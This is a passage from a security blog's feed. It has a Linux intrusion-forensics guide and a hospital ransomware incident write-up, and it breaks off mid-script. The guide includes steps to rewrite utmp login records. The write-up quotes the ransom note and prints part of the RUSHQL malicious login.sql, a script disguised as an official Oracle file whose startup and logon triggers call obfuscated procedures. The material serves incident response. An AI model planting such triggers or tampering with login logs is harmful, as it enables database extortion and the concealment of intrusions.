    <content type="html"><![CDATA[<p>换了一个主题，地址：<a href="https://gitee.com/shenweiyan/hexo-theme-BlueLake" target="_blank" rel="noopener">https://gitee.com/shenweiyan/hexo-theme-BlueLake</a></p><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;换了一个主题，地址：&lt;a href=&quot;https://gitee.com/shenweiyan/hexo-theme-BlueLake&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://gitee.com/shenweiyan/hexo-theme-BlueLake&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>黑客与画家-三-不能说的话</title>
    <link href="http://airs-sec.com/2018/05/13/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6-%E4%B8%89-%E4%B8%8D%E8%83%BD%E8%AF%B4%E7%9A%84%E8%AF%9D/"/>
    <id>http://airs-sec.com/2018/05/13/黑客与画家-三-不能说的话/</id>
    <published>2018-05-13T11:27:55.000Z</published>
    <updated>2018-07-09T06:58:29.851Z</updated>
    
    <content type="html"><![CDATA[<ul><li>明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。<ul><li><strong>你是一个随大流的人吗？</strong></li><li>一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。</li><li>与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。</li><li>如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。</li></ul></li></ul><a id="more"></a><ul><li><p><strong>真话</strong></p><ul><li>触怒他人的言论是那些可能会有人相信的言论。</li></ul></li><li><strong>异端学说</strong></li><li><strong>时空差异</strong></li><li><strong>道貌岸然</strong><ul><li>因为他们觉得孩子不应该知道成年人语言的所有内容，只需知道一部分适合儿童的词就行了。我们喜欢孩子们看上去天真无邪。</li><li>他的头脑或多或少是纯洁无瑕的，一点也不知道哪些“不能说的话”，从来没有被真实的社会生活“污染”过。</li><li>. 孩子眼里的世界是不真实的，是一个被灌输进他们头脑的假想世界。</li></ul></li><li><strong>机制</strong><ul><li><ol><li>如果一个团体强大到无比自信，它根本不会在乎别人的抨击。</li></ol></li></ul></li><li><strong>为什么这么做</strong><ul><li>智力越高的人，越愿意去思考那些惊世骇俗的思想观点。</li><li>做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。</li><li>训练自己去想那些不能想的事情，你获得的好处会超过所得到的想法本身。</li></ul></li><li><strong>守口如瓶</strong><ul><li><ol><li>与笨蛋辩论，你也会变成笨蛋。</li></ol></li><li>自由思考比畅所欲言更重要。</li></ul></li><li><strong>笑脸相迎？</strong></li><li><strong>永远质疑</strong><ul><li>时间就是一种产生距离的简单方法。</li><li>如果你想要清晰地思考，就必须远离人群。</li><li>小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再耍小孩子脾气的人。但是，很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;你是一个随大流的人吗？&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。&lt;/li&gt;
&lt;li&gt;与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。&lt;/li&gt;
&lt;li&gt;如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>linux取证分析</title>
    <link href="http://airs-sec.com/2018/04/20/linux%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/"/>
    <id>http://airs-sec.com/2018/04/20/linux取证分析/</id>
    <published>2018-04-20T09:16:55.000Z</published>
    <updated>2018-04-20T09:19:26.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux取证分析"><a href="#linux取证分析" class="headerlink" title="linux取证分析"></a>linux取证分析</h1><p>@(C1-linux)</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/wallhaven-640380.jpg" alt="enter description here" title="wallhaven-640380"></p><blockquote><p>如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。</p></blockquote><a id="more"></a><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># w</span></span><br><span class="line"><span class="comment"># 显示当前登录系统的所有用户</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_21-57-03.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># lastlog</span></span><br><span class="line"><span class="comment"># 显示最近登录操作系统的所有用户，引用/var/log/lastlog二进制文件中的信息</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_22-05-13.png" alt="2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  last</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前和曾经登入系统的用户信息，它默认读取的是/var/log/wtmp文件的信息。</span></span><br><span class="line"><span class="comment"># 输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。</span></span><br><span class="line"><span class="comment">#注意最后一行输出的是wtmp文件起始记录的时间。当然也可以通过last -f参数指定读取文件，可以是/var/log/btmp、/var/run/utmp</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-18_22-02-16.png" alt="3"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lastb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看登录失败的用户,默认读取的是/var/log/btmp中文件的信息</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-40-46.png" alt="5"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前登录用户的信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># who</span></span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-47-15.png" alt="6"></p><hr><p><strong>二进制文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/run/utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息，uptime记录系统启动时间；</span><br><span class="line"></span><br><span class="line">/var/log/wtmp：记录当前正在登录和历史登录系统的用户信息，默认由last命令查看；</span><br><span class="line"></span><br><span class="line">/var/log/btmp：记录失败的登录尝试信息，默认由lastb命令查看。</span><br></pre></td></tr></table></figure><p><strong>如何查看二进制文件的内容</strong></p><blockquote><p>1、xxd</p></blockquote><p>xdd /var/log/wtmp</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_14-03-15.png" alt="4"></p><blockquote><p>2、last -f /var/log/wtmp,同样可以查看<code>/var/log/*tmp</code>文件中的内容</p></blockquote><blockquote><p>3、utmpdump(推荐)</p></blockquote><blockquote><p>3.1 utmpdump [options] filename</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-20_16-00-23.png" alt="7"></p><blockquote><p>输出格式说明</p></blockquote><ul><li>1、显示会话识别符</li><li>2、PID</li><li>3、以下值：<ul><li>– ： 运行等级改变/重启</li><li>bw ： 启动守护进程</li><li>数字： 表示tty号</li></ul></li><li>4、可为空/用户名/重启/运行级别</li><li>5、主tty/pty(伪终端)</li><li>6、远程主机名(本地登录为空，返回内核版本)</li><li>7、远程系统的IP地址(本地为0.0.0.0)</li><li>8、该记录创建的日期和时间</li></ul><p>在/var/log/wtmp中，会话标识符为1的代表一次新的登录时间的特征，会话标识符8表示登出事件的特征。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 输出特定的字段</span><br><span class="line"></span><br><span class="line"># utmpdump /var/log/wtmp | grep -E &quot;\[7].*airs&quot; | awk -v OFS=&quot;,&quot; &apos;BEGIN &#123;FS=&quot;]&quot;&#125;;&#123;print $2,$4,$7,$8&#125;&apos; | sed -e &apos;s/\[//g&apos; -e &apos;s/\]//g&apos;</span><br></pre></td></tr></table></figure><blockquote><p>3.2 修改utmp或wtmp等二进制文件</p></blockquote><ul><li><code># utmpdump /var/log/utmp &gt; tmp_output</code></li><li><code>&lt;使用文本编辑器修改 tmp_output&gt;</code></li><li><code># utmpdump -r tmp_output &gt; /var/log/utmp</code></li></ul><hr><p><strong>查完了用户登录之后，查看流量和进程相关的情况：</strong></p><p>流量：</p><blockquote><p>top</p></blockquote><blockquote><p>iftop</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-55-11.png" alt="0"></p><blockquote><p>nethogs</p></blockquote><p>安装nethogs：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install nethogs</span><br><span class="line"></span><br><span class="line">apt-get install nethogs</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-58-28.png" alt="10"></p><p>上图中的PID为3248和3218的进程存在问题，直接查看进程ID号，进程相关的东西都存放在/proc/PID下。</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-04-11.png" alt="11"></p><p>利用strace对PID进行追踪。</p><blockquote><p><code>strace -tt -p 3218</code></p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-10-20.png" alt="12"></p><p>进程：</p><p>注意UID为0的进程</p><blockquote><p>ps -ef</p></blockquote><p>检查隐藏进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ps -ef | awk &apos;&#123;print &#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line"></span><br><span class="line"># ls /porc |sort -n|uniq &gt;2</span><br><span class="line"></span><br><span class="line"># diff 1 2</span><br></pre></td></tr></table></figure><blockquote><p>lsof -p PID</p></blockquote><p>查看该进程所有打开的文件</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_00-18-10.png" alt="12"></p><blockquote><p>lsof -i</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">dhclient  2970 root    6u  IPv4  25819      0t0  UDP *:bootpc</span><br><span class="line">udisks-da 3218 root    3u  IPv4  35724      0t0  TCP localhost:42070-&gt;122.224.32.32:6009 (SYN_SENT)</span><br><span class="line">udisks-da 3248 root    3u  IPv4  37848      0t0  TCP localhost:42072-&gt;122.224.32.32:6009 (SYN_SENT)</span><br></pre></td></tr></table></figure><blockquote><p>netstat -tlunp</p></blockquote><p>检查系统后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/crontab</span><br><span class="line"># ls /var/spool/cron/</span><br><span class="line"># cat /etc/rc.d/rc.local</span><br><span class="line"># ls /etc/rc.d</span><br><span class="line"># ls /etc/rc3.d</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-22_15-48-27.png" alt="132"></p><p><a href="https://www.cnblogs.com/kevingrace/p/5895116.html" target="_blank" rel="noopener">更多查看</a></p><hr><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><blockquote><p>strace命令是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。</p></blockquote><p><a href="http://man.linuxde.net/strace" target="_blank" rel="noopener">strace具体用法</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file ./udisks-daemon</span></span><br><span class="line">./udisks-daemon: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.4, not stripped</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-21_23-23-40.png" alt="9"></p><p>来自：<a href="https://www.anquanke.com/post/id/82796" target="_blank" rel="noopener">https://www.anquanke.com/post/id/82796</a></p><p>是一种病毒文件，对病毒文件进行跟踪，发现连接的ip及端口。</p><p><img src="http://obgutsg63.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720180121231637.jpg" alt="8"></p><hr><p>病毒扫描</p><p>ClamAV</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-23_11-33-13.png" alt="13"></p><p>1、安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># yum install -y epel-release</span><br><span class="line"></span><br><span class="line"># yum install -y clamav</span><br></pre></td></tr></table></figure><p>2、更新病毒库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo freshclam</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-23_11-41-02.png" alt="14"></p><p>3、如何使用</p><p>clamav扫描使用clamavscan命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">扫描所有用户的主目录:clamavscan -r /home</span><br><span class="line"></span><br><span class="line">扫描根目录：clamav -r /</span><br><span class="line"></span><br><span class="line">扫描服务器上的所有文件并显示有问题的文件：clamav -r --bell -i /</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/20180123114918.png" alt="14"></p><p><img src="http://obgutsg63.bkt.clouddn.com/20180123115011.png" alt="15"></p><p><img src="http://obgutsg63.bkt.clouddn.com/20180123115207.png" alt="16"></p><p><a href="http://www.clamav.net" target="_blank" rel="noopener">ClamAV官网</a></p><p><a href="http://wiki.ubuntu.org.cn/ClamAV" target="_blank" rel="noopener">ClamAV_HELP</a></p><hr><p>参考：</p><p><a href="http://www.linuxidc.com/Linux/2014-11/109361.htm" target="_blank" rel="noopener">使用 utmpdump 监控 CentOS 用户登录历史</a></p><p><a href="https://www.cnblogs.com/lizhaoxian/p/5981029.html" target="_blank" rel="noopener">Linux用户登录记录日志和相关查看命令汇总</a></p><p><a href="https://bash-prompt.net/guides/server-hacked/" target="_blank" rel="noopener">How To Tell If Your Linux Server Has Been Compromised</a></p><p><a href="https://www.cnblogs.com/kerrycode/p/4754820.html" target="_blank" rel="noopener">https://www.cnblogs.com/kerrycode/p/4754820.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;linux取证分析&quot;&gt;&lt;a href=&quot;#linux取证分析&quot; class=&quot;headerlink&quot; title=&quot;linux取证分析&quot;&gt;&lt;/a&gt;linux取证分析&lt;/h1&gt;&lt;p&gt;@(C1-linux)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/wallhaven-640380.jpg&quot; alt=&quot;enter description here&quot; title=&quot;wallhaven-640380&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="linux" scheme="http://airs-sec.com/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次某医院勒索软件事件处理整理</title>
    <link href="http://airs-sec.com/2018/03/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E5%8C%BB%E9%99%A2%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%95%B4%E7%90%86/"/>
    <id>http://airs-sec.com/2018/03/01/记一次某医院勒索软件事件处理整理/</id>
    <published>2018-03-01T06:35:13.000Z</published>
    <updated>2018-03-01T06:41:33.224Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1519886469360.jpg" alt="enter description here"></p><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><blockquote><p>2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。</p></blockquote><blockquote><p>基于这种紧急情况，公司立马出动应急人员，赶到客户现场。</p></blockquote><blockquote><p>到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下<code>（你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.）</code>，初步判断为<code>Ransom_RUSHQL.A</code>勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。</p></blockquote><blockquote><p>由于是生成库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。</p></blockquote><p><strong>病毒如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Copyright (c) 1988, 2011, Oracle and/or its affiliates. </span><br><span class="line">-- All rights reserved. </span><br><span class="line">--</span><br><span class="line">-- NAME</span><br><span class="line">--   login.sql</span><br><span class="line">--</span><br><span class="line">-- DESCRIPTION</span><br><span class="line">--   PL/SQL global login &quot;site profile&quot; file</span><br><span class="line">--</span><br><span class="line">--   Add any PL/SQL commands here that are to be executed when a</span><br><span class="line">--   user starts PL/SQL, or uses the PL/SQL CONNECT command.</span><br><span class="line">--</span><br><span class="line">-- USAGE</span><br><span class="line">--   This script is automatically run</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">..............此处为恶意软件混淆的官方声明,非官方声明......................</span><br><span class="line"></span><br><span class="line">-- This SQL was created by Oracle ; You should never remove/delete it!</span><br><span class="line"></span><br><span class="line">--     MODIFIED   (MM/DD/YY)</span><br><span class="line">--     esoyleme   02/27/02 - remove xumuts.plb</span><br><span class="line">--     rburns     02/20/02 - re-validate catalog</span><br><span class="line">--     rburns     02/11/02 - add registry version</span><br><span class="line">--     rpang      01/25/02 - add UTL_GDK</span><br><span class="line">--     esoyleme   01/23/02 - bring in changes from oraolap</span><br><span class="line"></span><br><span class="line">..............此处内容过多，省略......................</span><br><span class="line">            </span><br><span class="line">--     akruglik   05/06/98 -  add tabfragobj# to lobfrag$ and </span><br><span class="line">--                            tabpartobj# to lobcomppart$</span><br><span class="line">--     nagarwal   05/02/98 -  create indexes on operator catalogs</span><br><span class="line">--     akruglik   05/01/98 -  add defbufpool to PARTLOB$ and LOBCOMPPART$       </span><br><span class="line">--     syeung     04/27/98 -  remove type# from tabcompart$ and indcompart$ and</span><br><span class="line">--                            make deflists and defgroups nullable</span><br><span class="line"></span><br><span class="line">create or replace procedure &quot;DBMS_SUPPORT_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">6f2 467</span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">PROMPT Create &quot;DBMS_SUPPORT_INTERNAL         &quot;</span><br><span class="line">create or replace trigger &quot;DBMS_SUPPORT_INTERNAL         &quot;</span><br><span class="line">after startup on database </span><br><span class="line">begin</span><br><span class="line"> &quot;DBMS_SUPPORT_INTERNAL         &quot;;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE procedure  &quot;DBMS_SYSTEM_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">3a5 384</span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE TRIGGER &quot;DBMS_SYSTEM_INTERNAL         &quot;</span><br><span class="line">  AFTER LOGON ON DATABASE</span><br><span class="line">BEGIN</span><br><span class="line"> &quot;DBMS_SYSTEM_INTERNAL         &quot;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">create or replace procedure DBMS_STANDARD_FUN9 wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">69 9a</span><br><span 